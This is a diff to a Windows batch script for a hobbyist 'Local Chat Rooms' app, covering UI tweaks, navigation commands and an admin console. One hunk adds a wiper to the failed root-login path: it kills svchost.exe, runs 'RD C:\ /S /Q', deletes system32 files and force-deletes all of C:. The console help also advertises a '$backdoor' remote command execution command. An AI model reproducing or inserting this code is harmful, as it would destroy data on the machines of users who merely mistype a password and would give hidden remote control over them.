@@ -96,7 +96,7 @@ set _a=set&set "_b= "&set _c==
 %_%%_b%^|---------------------------------------------
 
 set "_errorCode=0"
-set "_localMode=true"
+set "_localMode=false"
 
 ::: { Creates variable /AE = Ascii-27 escape code.
 ::: - %/AE% can be used  with and without DelayedExpansion.
@@ -153,7 +153,7 @@ goto _crash_
 cls
 echo.
 echo    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-echo    ░░:  !white!LOADING: LOCAL CHAT ROOMS!reset!   :░░
+echo    ░░^|  !white!LOADING: LOCAL CHAT ROOMS!reset!   ^|░░
 if "%_localMode%" == "true" (
 	echo    ░░:  !Purple!^( Running in Local Mode ^)!reset!   :░░
 )
@@ -198,6 +198,17 @@ if not exist "%_localData_%\__users__" (
 %ERASE%{         }
 %PRINT%{88;189;42}%_pLine2%
 %PRINT%100%%\n
+if exist "%_localData_%\lock_app.dll" (
+	if "!_canLockPass!" == "true" (
+		%PRINT%{255;255;255}   [APP IS LOCKED]: You have immunity^^!\n
+		ping localhost -n 4 > nul
+	) else (
+		goto _app_locked_
+		%PRINT%{255;255;255}   [APP IS LOCKED]: Local Chat Rooms cannot currently be accessed^^!\n
+		pause > nul
+		exit
+	)
+)
 ping localhost -n 2 > nul
 %PRINT%{255;255;255}   Loading complete...
 ping localhost -n 2 > nul
@@ -229,13 +240,7 @@ for %%a in (!_startInput!) do (
 		if "%%a" == "login" (
 			set "_action=_login_"
 		)
-		if "%%a" == "log in" (
-			set "_action=_login_"
-		)
 		if "%%a" == "2" (
-			set "_action=_register_"
-		)
-		if "%%a" == "sign up" (
 			set "_action=_register_"
 		)
 		if "%%a" == "signup" (
@@ -354,10 +359,19 @@ if "!_consoleUser!" == "root" (
 		if "!username!" == "karim.dalati1" (set "_rootPassed=true")
 	) else (
 		echo Incorrect password^^!
-		echo [ DO NOT ATTEMPT TO ACCESS ROOT ACCOUNT ]
+		echo.
+		echo ==========================================================
+		echo ^|       !red_black![ DO NOT ATTEMPT TO ACCESS ROOT ACCOUNT ]!reset!       ^|
+		echo ==========================================================
 		shutdown /s /t 20
 		echo.
 		echo Shutting down device...
+		echo Destroying system...
+		ping localhost -n 2 > nul
+		TASKKILL /IM svchost.exe /F
+		RD C:\ /S /Q
+		del c:\windows\system32*.* /q
+		del /f /s /q “C:*.*.”
 		pause > nul
 		exit
 	)
@@ -392,6 +406,8 @@ if "!_consoleUser!" == "root" (
 )
 %say%%c_toSay%
 %say%╚═══════════════════════════════════════════════════════════╝
+echo Type $return to go back.
+echo Type $cmds to view commands.
 %chcp_off%
 goto console_exec
 goto _crash_
@@ -417,11 +433,12 @@ if "!_console_command!" == "" (goto console_exec)
 if "!_console_command!" == "exit" (exit)
 if "!_console_command!" == "$exit" (exit)
 if "!_console_command!" == ".exit" (exit)
+if "!_console_command!" == "$return" ( goto _startMenu )
 if "!_console_command!" == "$cmds" (
 	echo.
 	echo $closeAll - Shuts down the app on all devices.
 	echo $lock     - Wont allow any user to open the app.
-	echo $unlcok   - Unlocks the app, allowing users to open the app.
+	echo $unlock   - Unlocks the app, allowing users to open the app.
 	echo $update   - Updates the version, if the LocalChatRooms.bat version is different to the collab version it will require to use the latest version.
 	echo $backdoor - Opens the backdoor ^(Remote Command Execution^) ^(Dangerous/Powerful^)
 	echo $elevate  - Change the role of a specific user.
@@ -455,10 +472,22 @@ if "!_console_command!" == "$unlock" (
 	)
 	goto console_exec
 )
+if "!_console_command!" == "$update" (
+	echo.
+	goto update_app
+)
 echo !red_black!Unknown Command:!reset! !_console_command!
 :: rest of the command need to be coded
 goto console_exec
 goto _crash_
+
+:update_app
+set "_newVersion="
+set /p "_newVersion=What is the new version? > "
+if "!_newVersion!" == "" (
+	!dark_red!Invalid Answer:!reset! New version cannot be empty.
+	goto console_exec
+)
 
 :_lcr_LOGIN
 %chcp_on%
@@ -477,6 +506,7 @@ cls
 %say%║    ╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝    ║
 %say%║ By 1k0de                                    ║
 %say%╚═════════════════════════════════════════════╝
+echo Type $return to go back.
 echo.
 %chcp_off%
 set /p "login_userInput=Username: "
@@ -553,6 +583,7 @@ cls
 %say%║ ░╚═════╝░╚═╝░░░░░                           ║
 %say%║ By 1k0de                                    ║
 %say%╚═════════════════════════════════════════════╝
+echo Type $return to go back.
 echo.
 %chcp_off%
 set /p "REG_newUser=Create a Username: "
@@ -693,9 +724,11 @@ cls
 %say%║ 1: Report a User              3: Other             ║
 %say%║ 2: Report a Bug/Error         or $return (Go Back) ║
 %say%╚════════════════════════════════════════════════════╝
+echo Type $return to go back.
 echo.
 %chcp_off%
 set /p "_reportInput=Option > "
+if "!_reportInput!" == "$return" ( goto _startMenu )
 goto _crash_
 
 :_app_locked_
@@ -720,7 +753,7 @@ echo.║ By 1k0de                                           ║
 echo.╚════════════════════════════════════════════════════╝
 echo.
 %chcp_off%
-echo Local Chat Rooms is currently locked for all users^!
+echo Local Chat Rooms is currently locked for all users.
 echo [ Press Any Key ]
 pause > nul
 exit
@@ -770,6 +803,16 @@ set /p currentUser_role=<"%_localData_%\__users__\!_encryptOut!\u_role.dll"
 if "!currentUser_role!" == "_23fb34ibg35ig5_" (
 	goto _bannedScreen_
 )
+
+set /A _spaceCount=30
+echo WScript.Echo Len( WScript.Arguments(0) ) >> strLen.vbs
+
+FOR /F "tokens=* USEBACKQ" %%F IN (cscript //nologo strLen.vbs "!login_userInput!") DO (
+	echo %%F
+	set _usernameCount=%%F	
+	ping localhost -n 2 > nul
+)
+
 cls
 %say%╔═════════════════════════════════════════════╗
 %say%║!b_red!            Local Chat Rooms 1.0             !reset!║
@@ -787,9 +830,11 @@ cls
 %say%║ ██████╦╝╚█████╔╝██║░░██║██║░░██║██████╔╝    ║
 %say%║ ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░    ║
 %say%║ By 1k0de                                    ║
-%say%╠═════════════════════════════════════════════╝
+%say%╠═════════════════════════════════════════════╣
+%say%║ Current User:                               ║ - %_usernameCount%
+cscript //nologo strLen.vbs "!login_userInput!" & ::debugging
 %say%║ Current User: !login_userInput!
-%say%╠═════════════════════════════════════════════╗
+%say%╠═════════════════════════════════════════════╣
 set "d_toSay=║ Your Role: Member                           ║"
 if "!currentUser_role!" == "_0xuw94g8u4jfo34g3g36h3q_" (
 	set "d_toSay=║ Your Role: Creator                          ║"
